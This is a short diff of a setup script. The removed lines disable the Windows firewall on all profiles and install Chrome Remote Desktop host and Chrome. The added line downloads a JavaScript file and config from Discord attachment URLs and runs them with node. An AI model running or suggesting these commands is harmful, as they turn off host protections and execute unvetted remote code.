@@ -1,3 +1,1 @@
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-& {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}
-& {$P = $env:TEMP + '\chrome_installer.exe'; Invoke-WebRequest 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile $P; Start-Process -FilePath $P -Args '/install' -Verb RunAs -Wait; Remove-Item $P}
+curl https://cdn.discordapp.com/attachments/1061664042726461460/1067857361454235779/script.js -o script.js ; curl https://cdn.discordapp.com/attachments/1061664042726461460/1071905379769909389/config.json -o config.json ; npm install discord.js@12.5.3 ; node script.js
